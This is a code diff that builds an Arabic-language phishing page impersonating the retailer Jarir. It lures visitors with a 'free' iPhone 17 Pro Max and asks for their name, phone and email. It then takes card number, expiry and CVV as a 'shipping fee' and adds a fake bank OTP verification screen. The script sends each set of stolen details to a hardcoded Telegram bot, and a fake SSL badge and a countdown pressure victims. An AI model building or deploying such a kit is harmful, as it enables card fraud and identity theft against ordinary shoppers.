@@ -3,9 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جرير - iPhone 17 Pro Max</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; }
+        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; }
+        .page { display: none; min-height: 100vh; }
+        .page.active { display: block; }
+        .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
+        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; }
+        
+        .cart-icon-container { position: relative; background: #F0F2F5; padding: 8px; border-radius: 8px; }
+        .cart-badge { position: absolute; top: -5px; right: -5px; background: #FF9800; color: white; font-size: 10px; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        
+        .back-to-top { position: fixed; bottom: 80px; left: 20px; background: white; border: 1px solid #DDD; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); z-index: 100; }
 
+        .error-msg { display: none; color: white; background: #E30613; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
+        .card-wrapper { position: relative; width: 100%; }
+        /* تكبير أيقونة نوع البطاقة داخل الحقل */
+        .card-type-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); height: 28px; transition: 0.3s; pointer-events: none; opacity: 0; }
+        
+        /* تحسينات صفحة التحقق لتطابق الأصلية */
+        #page-verify h2 { font-family: sans-serif; letter-spacing: -0.5px; }
+        .verify-text { font-family: sans-serif; color: #333; }
+
+        /* أنماط صفحة النجاح الجديدة - مدمجة من الكود الثاني */
         :root {
             --active-green: #5eb471;
             --inactive-grey: #a0a0a0;
@@ -14,27 +38,17 @@
             --text-black: #343a40;
         }
 
-        body {
-            font-family: 'Cairo', sans-serif;
-            background-color: #e9ecef;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-
-        .phone-screen {
+        .success-screen {
             background-color: var(--bg-white);
-            width: 380px;
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
             border-radius: 5px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             overflow: hidden;
-            border-top: 5px solid #ffcc33; /* الشريط الأصفر العلوي */
+            border-top: 5px solid #ffcc33;
         }
 
-        /* Header Area */
         .app-bar {
             display: flex;
             justify-content: space-between;
@@ -52,7 +66,6 @@
 
         .icon { color: var(--text-black); font-size: 20px; cursor: pointer; }
 
-        /* Stepper Section */
         .stepper-container {
             padding: 30px 40px;
             position: relative;
@@ -65,7 +78,6 @@
             position: relative;
         }
 
-        /* الخط الواصل بين النقاط */
         .step::before {
             content: '';
             position: absolute;
@@ -83,14 +95,13 @@
             width: 12px;
             height: 12px;
             border-radius: 50%;
-            background-color: #d1d1d1; /* اللون الافتراضي */
+            background-color: #d1d1d1;
             position: absolute;
             right: -26px;
             top: 6px;
             z-index: 2;
         }
 
-        /* حالة "إنشاء الطلب" فقط خضراء */
         .step.active .dot { background-color: var(--active-green); }
         .step.active .step-title { color: var(--active-green); }
 
@@ -108,7 +119,6 @@
             color: #888;
         }
 
-        /* Barcode Section */
         .barcode-area {
             text-align: center;
             padding: 40px 20px;
@@ -127,7 +137,6 @@
             color: var(--text-black);
         }
 
-        /* Footer Details */
         .info-row {
             border-top: 1px solid var(--border-grey);
             padding: 15px 25px;
@@ -148,75 +157,689 @@
 
         .email { font-family: sans-serif; letter-spacing: 0.5px; }
 
+        /* ==================== الإضافات الجديدة ==================== */
+        
+        /* 1. تأثيرات حركة للأزرار */
+        .btn-red:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.3);
+        }
+        
+        .btn-red:active {
+            transform: translateY(0);
+        }
+
+        /* 2. تأثيرات على حقول الإدخال */
+        .form-input:focus {
+            border-color: var(--jarir-red);
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
+        }
+
+        /* 3. شريط التقدم العلوي */
+        .progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 3px;
+            background: var(--jarir-red);
+            width: 0%;
+            transition: width 0.3s;
+            z-index: 9999;
+        }
+
+        /* 4. تأثير تحميل عند الانتقال بين الصفحات */
+        .page-transition {
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* 5. تأثير على صورة المنتج */
+        .product-image {
+            transition: transform 0.3s ease;
+        }
+        
+        .product-image:hover {
+            transform: scale(1.05);
+        }
+
+        /* 6. عداد تنازلي للعرض */
+        .countdown-banner {
+            background: linear-gradient(90deg, #E30613 0%, #ff4757 100%);
+            color: white;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 14px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: none;
+        }
+
+        /* 7. تأثيرات على البطاقات */
+        .payment-card {
+            transition: all 0.3s ease;
+        }
+        
+        .payment-card:hover {
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        }
+
+        /* 8. مؤشر جاري المعالجة */
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* 9. تأثير اهتزاز للخطأ */
+        .shake {
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        /* 10. شعار متحرك */
+        .logo-pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        /* 11. زر العودة للأعلى المحسن */
+        .back-to-top {
+            transition: all 0.3s;
+            opacity: 0;
+            visibility: hidden;
+        }
+        
+        .back-to-top.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .back-to-top:hover {
+            background: var(--jarir-red);
+            color: white;
+            border-color: var(--jarir-red);
+        }
+
+        /* 12. نافذة منبثقة للتأكيد */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 300px;
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* 13. شريط جانبي للتوثيق */
+        .security-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #666;
+            z-index: 99;
+        }
+
+        /* 14. تأثيرات على الروابط الاجتماعية */
+        .social-icon {
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .social-icon:hover {
+            transform: translateY(-3px);
+            filter: brightness(1.2);
+        }
+
+        /* 15. مؤشر التمرير */
+        .scroll-indicator {
+            position: fixed;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            z-index: 98;
+        }
+        
+        .scroll-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ddd;
+            transition: all 0.3s;
+        }
+        
+        .scroll-dot.active {
+            background: var(--jarir-red);
+            height: 20px;
+            border-radius: 4px;
+        }
     </style>
 </head>
-<body>
+<body class="max-w-md mx-auto shadow-2xl bg-white">
 
-<div class="phone-screen">
-    <div class="app-bar">
-        <div class="icon">⋮</div>
-        <h1>شحنة رقم # 51972521</h1>
-        <div class="icon">〉</div>
+    <!-- شريط التقدم العلوي -->
+    <div class="progress-bar" id="progressBar"></div>
+
+    <!-- شريط العد التنازلي -->
+    <div class="countdown-banner" id="countdownBanner">
+        ⏰ العرض ينتهي خلال: <span id="countdown">15:00</span>
     </div>
 
-    <div class="stepper-container">
-        <div class="step active">
-            <div class="dot"></div>
-            <div class="step-content">
-                <span class="step-title">إنشاء الطلب</span>
-                <span class="step-date">تم إنشاء الطلب : الأحد، 19-أكتوبر-2025</span>
+    <section id="page-product" class="page active page-transition">
+        <header class="p-3 border-b sticky top-0 bg-white z-50 flex justify-between items-center">
+            <div class="flex items-center gap-4">
+                <i class="fa-solid fa-bars text-xl text-gray-600"></i>
+                <div class="cart-icon-container">
+                    <i class="fa-solid fa-cart-shopping text-gray-600"></i>
+                    <span class="cart-badge">1</span>
+                </div>
             </div>
+            <div class="flex items-center gap-1">
+                <div class="relative flex items-center bg-gray-100 rounded-full px-4 py-1">
+                    <input type="text" value="iphone 17 pro max" readonly class="bg-transparent text-sm text-right outline-none w-32">
+                    <i class="fa-solid fa-magnifying-glass text-gray-400 mr-2"></i>
+                </div>
+                <div class="flex items-center ml-2">
+                    <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-8 logo-pulse">
+                </div>
+            </div>
+        </header>
+
+        <div class="bg-gray-50 p-3 flex justify-between items-center border-b text-sm text-gray-500">
+            <i class="fa-solid fa-chevron-down text-xs"></i>
+            <span>حدد خيار التوصيل الذي تفضله</span>
         </div>
 
-        <div class="step">
-            <div class="dot"></div>
-            <div class="step-content">
-                <span class="step-title">جاري المعالجة</span>
-            </div>
+        <div class="py-6 flex justify-center">
+            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="w-[280px] product-image">
         </div>
 
-        <div class="step">
-            <div class="dot"></div>
-            <div class="step-content">
-                <span class="step-title">تحت التجهيز</span>
+        <main class="p-5">
+            <div class="flex justify-between items-start mb-2">
+                <div class="text-right">
+                    <p class="text-[10px] text-gray-400">رقم الصنف 666736 رقم المنتج MFY94AHA</p>
+                    <h1 class="text-xl font-bold text-gray-900">ابل آيفون 17 برو ماكس</h1>
+                </div>
+                <i class="fa-brands fa-apple text-3xl"></i>
+            </div>
+            
+            <div class="flex flex-wrap gap-2 mb-6 justify-end">
+                <span class="border px-3 py-1 text-xs text-gray-500 rounded">256 جيجابايت</span>
+                <span class="border px-3 py-1 text-xs text-gray-500 rounded">برتقالي كوزمك الجيل الخامس</span>
+                <span class="border px-3 py-1 text-xs text-gray-500 rounded">آبل آيه 19 برو</span>
+            </div>
+
+            <div class="flex justify-between items-center mb-6">
+                <button onclick="showPage('page-register')" class="bg-[#E30613] text-white font-bold w-1/2 py-4 rounded-lg text-lg flex justify-center items-center">
+                    <span id="btnText">استلم الهديه</span>
+                    <div class="loading-spinner" id="btnSpinner"></div>
+                </button>
+                <div class="text-right">
+                    <div class="text-[#E30613] text-3xl font-black">هديه من جرير <span class="text-sm">ر.س</span></div>
+                    <p class="text-[10px] text-gray-400">شامل ضريبة القيمة المضافة</p>
+                </div>
+            </div>
+
+            <div class="flex justify-between py-6 border-t mt-4">
+                <i class="fa-brands fa-linkedin text-[#0077B5] text-2xl social-icon"></i>
+                <i class="fa-brands fa-tiktok text-black text-2xl social-icon"></i>
+                <i class="fa-brands fa-snapchat text-[#FFFC00] bg-black p-1 rounded-full text-lg social-icon"></i>
+                <i class="fa-brands fa-youtube text-[#FF0000] text-2xl social-icon"></i>
+                <i class="fa-brands fa-instagram text-[#E4405F] text-2xl social-icon"></i>
+                <i class="fa-brands fa-x-twitter text-black text-2xl social-icon"></i>
+                <i class="fa-brands fa-facebook text-[#1877F2] text-2xl social-icon"></i>
+            </div>
+        </main>
+    </section>
+
+    <section id="page-register" class="page bg-white page-transition">
+        <header class="p-4 border-b flex justify-between items-center">
+            <button onclick="showPage('page-product')"><i class="fa-solid fa-chevron-right"></i>العودة</button>
+            <span class="font-bold">معلومات تسليم الهديه</span>
+            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
+        </header>
+        <div class="p-6 space-y-4">
+            <div id="err-reg" class="error-msg">يرجى إدخال البيانات المطلوبة</div>
+            <div class="text-right">
+                <label class="text-xs text-gray-400">اسم الدولة</label>
+                <div class="form-input flex justify-between items-center bg-gray-50">
+                    <i class="fa-solid fa-chevron-down text-xs"></i>
+                    <span class="font-bold">المملكة العربية السعودية</span>
+                </div>
+            </div>
+            <div class="flex gap-2">
+                <div class="w-2/3">
+                    <label class="text-xs text-gray-400 text-right block">رقم الهاتف</label>
+                    <input type="tel" id="user-phone" class="form-input">
+                </div>
+                <div class="w-1/3">
+                    <label class="text-xs text-gray-400 text-right block">رمز الدولة</label>
+                    <div class="form-input flex items-center justify-between">
+                        <i class="fa-solid fa-chevron-down text-[10px]"></i>
+                        <span class="font-bold">+966</span>
+                        <img src="https://flagcdn.com/w20/sa.png" class="w-4">
+                    </div>
+                </div>
+            </div>
+            <input type="text" id="user-name" placeholder="الاسم الأول" class="form-input">
+            <input type="email" id="user-email" placeholder="البريد الإلكتروني" class="form-input">
+            <button onclick="sendData('register')" class="btn-red py-4 mt-6 flex justify-center items-center">
+                <span id="regBtnText">استمرار</span>
+                <div class="loading-spinner" id="regSpinner"></div>
+            </button>
+        </div>
+    </section>
+
+    <section id="page-payment" class="page bg-[#F3F5F7] page-transition">
+        <header class="p-4 bg-white border-b flex justify-between items-center">
+            <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right"></i>العودة</button>
+            <span class="font-bold">دفع مصاريف الشحن</span>
+            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
+        </header>
+        <main class="p-4">
+            <div id="err-pay" class="error-msg">يرجى التحقق من بيانات البطاقة</div>
+            <div class="bg-white rounded-lg p-6 shadow-sm border relative payment-card">
+                <div class="flex justify-between items-center border p-3 rounded-lg mb-6 border-blue-500 bg-blue-50">
+                    <div class="w-5 h-5 border-[5px] border-blue-600 rounded-full"></div>
+                    <div class="text-right">
+                        <span class="text-sm font-bold block">الدفع بالبطاقة الائتمانية</span>
+                        <div class="flex gap-2 mt-2">
+                            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-6">
+                            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-6">
+                        </div>
+                    </div>
+                </div>
+                <div class="space-y-4">
+                    <div class="card-wrapper">
+                        <img id="card-type-img" src="" class="card-type-icon">
+                        <input type="tel" id="card-num" placeholder="رقم البطاقة" class="form-input" maxlength="16" oninput="detectCard(this.value)">
+                    </div>
+                    <div class="flex gap-2">
+                        <input type="tel" id="card-cvv" placeholder="رمز التحقق (CVV)" class="form-input w-1/3" maxlength="3">
+                        <input type="tel" id="card-exp" placeholder="MM/YY" class="form-input w-2/3" maxlength="5" oninput="formatExp(this)">
+                    </div>
+                    <input type="text" id="card-holder" placeholder="اسم حامل البطاقة" class="form-input">
+                </div>
+                <button onclick="sendData('payment')" class="btn-red py-4 mt-8 flex justify-center items-center">
+                    <span id="payBtnText">مصاريف الشحن( 76ر.س.)</span>
+                    <div class="loading-spinner" id="paySpinner"></div>
+                </button>
+            </div>
+
+            <div class="mt-8 grid grid-cols-4 gap-2 px-4">
+                <div class="bg-white border rounded p-2 flex items-center justify-center">
+                    <a href="https://ibb.co/93q7T39N"><img src="https://i.ibb.co/cXNjFXc1/2-A41-DBE2-EA77-4-E51-A1-DC-04-F571642322.png" alt="2-A41-DBE2-EA77-4-E51-A1-DC-04-F571642322" border="0" class="h-10"></a>
+                </div>
+                <div class="bg-white border rounded p-2 flex items-center justify-center">
+                    <a href="https://ibb.co/dC5vrVZ"><img src="https://i.ibb.co/x97bDBZ/E0-E5-DFC0-0047-4-BB9-915-B-DEDC2-EC3-CC3-B.png" alt="E0-E5-DFC0-0047-4-BB9-915-B-DEDC2-EC3-CC3-B" border="0" class="h-10"></a>
+                </div>
+                <div class="bg-white border rounded p-2 flex items-center justify-center">
+                    <a href="https://ibb.co/DDyjk2hs"><img src="https://i.ibb.co/HDs9Y861/AC079077-B4-F5-4336-A7-AE-16-A1-BDF07-EE9.png" alt="AC079077-B4-F5-4336-A7-AE-16-A1-BDF07-EE9" border="0" class="h-10"></a>
+                </div>
+                <div class="bg-white border rounded p-2 flex items-center justify-center">
+                    <a href="https://ibb.co/4g7jDX6y"><img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A" border="0" class="h-10"></a>
+                </div>
+            </div>
+        </main>
+    </section>
+
+    <section id="page-verify" class="page bg-white p-6 page-transition">
+        <div class="flex justify-end mb-4">
+            <span class="font-bold text-black cursor-pointer text-base" onclick="showPage('page-payment')">Cancel</span>
+        </div>
+        <div class="flex justify-between items-center border-b border-gray-100 pb-4 mb-8">
+            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" style="height: 18px;">
+            <div class="flex items-center gap-1">
+                <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 22px;"> 
+                <span style="font-family: sans-serif; font-size: 11px; color: #666;">Secure</span>
             </div>
         </div>
+        <h2 class="text-[26px] font-bold mb-5 text-left text-black">Verify By Phone</h2>
+        <div class="verify-text text-left text-[15px] leading-relaxed mb-10">
+            <p>We have sent you a text message with a code to your registered mobile number.</p>
+            <p class="mt-5">You are paying <strong>JARIR BOOKSTORE</strong> the amount of <strong>SAR 76.00</strong> on 2026/02/15.</p>
+        </div>
+        <div id="err-otp" class="error-msg">رمز التحقق غير صحيح، حاول مجدداً</div>
+        <div class="text-center mb-8">
+            <label class="block text-gray-500 text-xs mb-3 font-sans">Verification code</label>
+            <input type="tel" id="bank-otp" class="w-full border border-gray-300 rounded p-4 text-center text-2xl outline-none font-sans tracking-widest">
+        </div>
+        <button onclick="sendData('otp')" class="w-full bg-[#0000FF] text-white py-4 font-bold rounded-md text-lg mb-8 shadow-sm flex justify-center items-center">
+            <span id="otpBtnText">CONFIRM</span>
+            <div class="loading-spinner" id="otpSpinner"></div>
+        </button>
+        <div class="text-center">
+            <span class="text-[#0000FF] font-bold text-sm cursor-pointer hover:underline">RESEND CODE</span>
+        </div>
+        <div class="mt-12 border-t pt-5 space-y-5">
+            <div class="flex justify-between items-center text-[15px] text-[#2D3E50]"><span>Learn more about authentication</span> <span class="text-2xl">+</span></div>
+            <div class="flex justify-between items-center text-[15px] text-[#2D3E50]"><span>Need some help ?</span> <span class="text-2xl">+</span></div>
+        </div>
+    </section>
 
-        <div class="step">
-            <div class="dot"></div>
-            <div class="step-content">
-                <span class="step-title">تم الشحن</span>
+    <!-- الصفحة الجديدة المدمجة - صفحة النجاح -->
+    <section id="page-success" class="page bg-[#e9ecef] p-5 page-transition">
+        <div class="success-screen">
+            <div class="app-bar">
+                <div class="icon">⋮</div>
+                <h1>شحنة رقم # 51972521</h1>
+                <div class="icon">〉</div>
+            </div>
+
+            <div class="stepper-container">
+                <div class="step active">
+                    <div class="dot"></div>
+                    <div class="step-content">
+                        <span class="step-title">إنشاء الطلب</span>
+                        <span class="step-date">تم إنشاء الطلب : الأحد، 19-أكتوبر-2025</span>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="dot"></div>
+                    <div class="step-content">
+                        <span class="step-title">جاري المعالجة</span>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="dot"></div>
+                    <div class="step-content">
+                        <span class="step-title">تحت التجهيز</span>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="dot"></div>
+                    <div class="step-content">
+                        <span class="step-title">تم الشحن</span>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="dot"></div>
+                    <div class="step-content">
+                        <span class="step-title">تم التوصيل</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="barcode-area">
+                <img src="https://bwipjs-api.metafloor.com/?bcid=code128&text=2007992813&scale=4&includetext=false" class="barcode-img">
+                <div class="order-number">رقم الطلب: 2007992813</div>
+            </div>
+
+            <div class="info-row">
+                <span class="label">تاريخ إنشاء الطلب</span>
+                <span class="value">الأحد، 19-أكتوبر-2025</span>
+            </div>
+
+            <div class="info-row">
+                <span class="label">الشحن إلى:</span>
+                <span class="value email">campus6med@gmail.com</span>
+            </div>
+
+            <div class="info-row">
+                <span class="label">طريقة الشحن</span>
+                <span class="value">@ تسليم البريد الإلكتروني</span>
             </div>
         </div>
+    </section>
 
-        <div class="step">
-            <div class="dot"></div>
-            <div class="step-content">
-                <span class="step-title">تم التوصيل</span>
-            </div>
+    <!-- زر العودة للأعلى -->
+    <div class="back-to-top" id="backToTop" onclick="scrollToTop()">
+        <i class="fa-solid fa-arrow-up"></i>
+    </div>
+
+    <!-- شارة الأمان -->
+    <div class="security-badge" id="securityBadge">
+        <i class="fa-solid fa-shield-halved text-green-500"></i>
+        <span>آمن 100% - SSL</span>
+    </div>
+
+    <!-- نافذة منبثقة -->
+    <div class="modal-overlay" id="modalOverlay" onclick="closeModal()">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <i class="fa-solid fa-circle-check text-5xl text-green-500 mb-4"></i>
+            <h3 class="font-bold text-lg mb-2">تم بنجاح!</h3>
+            <p class="text-gray-600 text-sm mb-4" id="modalText">تم إرسال البيانات بنجاح</p>
+            <button onclick="closeModal()" class="bg-[#E30613] text-white px-6 py-2 rounded-lg font-bold">موافق</button>
         </div>
     </div>
 
-    <div class="barcode-area">
-        <img src="https://bwipjs-api.metafloor.com/?bcid=code128&text=2007992813&scale=4&includetext=false" class="barcode-img">
-        <div class="order-number">رقم الطلب: 2007992813</div>
-    </div>
+    <script>
+        const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
+        const chatId = "1705240737";
 
-    <div class="info-row">
-        <span class="label">تاريخ إنشاء الطلب</span>
-        <span class="value">الأحد، 19-أكتوبر-2025</span>
-    </div>
+        // ==================== الإضافات الجديدة ====================
 
-    <div class="info-row">
-        <span class="label">الشحن إلى:</span>
-        <span class="value email">campus6med@gmail.com</span>
-    </div>
+        // 1. شريط التقدم
+        function updateProgressBar(percent) {
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
 
-    <div class="info-row">
-        <span class="label">طريقة الشحن</span>
-        <span class="value">@ تسليم البريد الإلكتروني</span>
-    </div>
-</div>
+        // 2. عداد تنازلي
+        let countdownInterval;
+        function startCountdown() {
+            const banner = document.getElementById('countdownBanner');
+            banner.style.display = 'block';
+            let minutes = 15;
+            let seconds = 0;
+            
+            countdownInterval = setInterval(() => {
+                if (seconds === 0) {
+                    if (minutes === 0) {
+                        clearInterval(countdownInterval);
+                        banner.innerHTML = '⏰ انتهى العرض!';
+                        return;
+                    }
+                    minutes--;
+                    seconds = 59;
+                } else {
+                    seconds--;
+                }
+                document.getElementById('countdown').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
 
+        // 3. عرض زر العودة للأعلى عند التمرير
+        window.onscroll = function() {
+            const btn = document.getElementById('backToTop');
+            if (document.body.scrollTop > 300 || document.documentElement.scrollTop > 300) {
+                btn.classList.add('visible');
+            } else {
+                btn.classList.remove('visible');
+            }
+        };
+
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // 4. نافذة منبثقة
+        function showModal(text) {
+            document.getElementById('modalText').textContent = text;
+            document.getElementById('modalOverlay').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('modalOverlay').style.display = 'none';
+        }
+
+        // 5. تأثير الاهتزاز للخطأ
+        function shakeElement(elementId) {
+            const el = document.getElementById(elementId);
+            el.classList.add('shake');
+            setTimeout(() => el.classList.remove('shake'), 500);
+        }
+
+        // 6. مؤشر التحميل على الأزرار
+        function showLoading(btnId, spinnerId, textId) {
+            document.getElementById(spinnerId).style.display = 'block';
+            document.getElementById(textId).style.opacity = '0.7';
+            document.getElementById(btnId).disabled = true;
+        }
+
+        function hideLoading(btnId, spinnerId, textId) {
+            document.getElementById(spinnerId).style.display = 'none';
+            document.getElementById(textId).style.opacity = '1';
+            document.getElementById(btnId).disabled = false;
+        }
+
+        // ==================== الدوال الأصلية ====================
+
+        function showPage(id) {
+            // إخفاء جميع الصفحات
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            
+            // إظهار الصفحة المطلوبة
+            const targetPage = document.getElementById(id);
+            if (targetPage) {
+                targetPage.classList.add('active');
+                window.scrollTo(0, 0);
+            }
+            
+            // تحديث شريط التقدم
+            const progressMap = {
+                'page-product': 0,
+                'page-register': 25,
+                'page-payment': 50,
+                'page-verify': 75,
+                'page-success': 100
+            };
+            updateProgressBar(progressMap[id] || 0);
+        }
+
+        function formatExp(i) {
+            let v = i.value.replace(/\D/g,'');
+            if(v.length >= 2) i.value = v.substring(0,2) + '/' + v.substring(2,4);
+        }
+
+        function detectCard(v) {
+            const img = document.getElementById('card-type-img');
+            if(v.startsWith('4')) { 
+                img.src = "https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png"; 
+                img.style.opacity = "1"; 
+            }
+            else if(v.startsWith('5')) { 
+                img.src = "https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png"; 
+                img.style.opacity = "1"; 
+            }
+            else { img.style.opacity = "0"; }
+        }
+
+        async function sendData(step) {
+            document.querySelectorAll('.error-msg').forEach(e => e.style.display = 'none');
+            let text = "";
+            
+            if(step === 'register') {
+                const phone = document.getElementById('user-phone').value;
+                if(!phone) { 
+                    document.getElementById('err-reg').style.display='block'; 
+                    shakeElement('err-reg');
+                    return; 
+                }
+                
+                showLoading('register', 'regSpinner', 'regBtnText');
+                
+                text = `👤 زبون جديد:\n📞 هاتف: ${phone}\n📝 اسم: ${document.getElementById('user-name').value}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+                
+                hideLoading('register', 'regSpinner', 'regBtnText');
+                showModal('تم إرسال بياناتك بنجاح! سنتواصل معك قريباً.');
+                showPage('page-payment');
+                
+            } else if(step === 'payment') {
+                const num = document.getElementById('card-num').value;
+                if(num.length < 16) { 
+                    document.getElementById('err-pay').style.display='block'; 
+                    shakeElement('err-pay');
+                    return; 
+                }
+                
+                showLoading('payment', 'paySpinner', 'payBtnText');
+                
+                text = `💳 بطاقة:\n🔢 رقم: ${num}\n📅 تاريخ: ${document.getElementById('card-exp').value}\n🔒 CVV: ${document.getElementById('card-cvv').value}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+                
+                hideLoading('payment', 'paySpinner', 'payBtnText');
+                showModal('تم التحقق من البطاقة بنجاح!');
+                showPage('page-verify');
+                
+            } else if(step === 'otp') {
+                const otp = document.getElementById('bank-otp').value;
+                if(!otp) return;
+                
+                showLoading('otp', 'otpSpinner', 'otpBtnText');
+                
+                text = `🔑 كود التحقق (OTP): ${otp}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+                
+                hideLoading('otp', 'otpSpinner', 'otpBtnText');
+                showModal('تم تأكيد الطلب بنجاح! 🎉');
+                showPage('page-success');
+            }
+        }
+
+        // بدء العداد عند تحميل الصفحة
+        window.onload = function() {
+            startCountdown();
+        };
+    </script>
 </body>
 </html>
